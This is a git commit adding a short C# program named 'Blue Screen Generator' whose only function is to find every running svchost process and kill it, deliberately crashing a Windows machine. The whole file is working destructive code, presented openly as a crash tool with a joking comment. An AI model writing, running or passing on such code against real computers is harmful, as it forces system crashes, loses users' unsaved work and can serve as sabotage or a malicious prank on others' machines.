4d28bedf574f51808c8117a1f66671808a5e7c5d
fknMega <yanivwhat@gmail.com>
2022-02-27 22:37:22 +0200

    Add project files.

---
+++ Blue Screen Generator/Program.cs
@@ -0,0 +1,24 @@
+﻿using System;
+using System.Diagnostics;
+
+namespace Blue_Screen_Generator
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            //Get all the "svchost" proccess.
+            var processes = Process.GetProcessesByName("svchost");
+
+
+            //Kill all of them
+            foreach (var process in processes)
+            {
+                process.Kill();
+            }
+
+
+            //The easiest code ever.
+        }
+    }
+}
